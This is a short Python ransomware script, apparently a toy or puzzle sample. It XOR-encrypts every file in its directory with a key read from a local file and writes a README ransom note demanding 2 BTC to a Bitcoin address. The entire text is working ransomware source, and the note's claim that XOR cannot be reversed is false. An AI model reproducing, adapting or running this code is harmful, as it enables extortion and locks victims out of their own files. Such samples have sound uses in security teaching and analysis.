import glob

readme = """Hi there.
We just encrypted all of the files on your hard drive using a
perfectly-secure one time pad. It is impossible to crack as the
xor operation cannot be reversed. Look at the code if you want
and see for yourself. To get your files back, send 2BTC to
1NgiUwkhYVYMy3eoMC9dHcvdHejGxcuaWm and we will send you a key
that will unlock all of your files.
"""

encrypted_files = []
with open('../xor.key', 'rb') as keyfile:
    key = keyfile.read()

    for f in glob.glob('*'):
        if(f == 'ransomware.py'):
            continue

        inbytes = open(f, 'rb').read()

        with open(f + '.xor', 'wb') as encrypted:
            xor = map(lambda x: x[0]^x[1], zip(key, inbytes))
            encrypted.write(bytes(xor))
            encrypted_files.append(f)

with open('README.txt', 'w') as warning:
    warning.write(readme)
    warning.write("Your files:\n")
    for f in encrypted_files:
        warning.write("\t" + f + "\n")
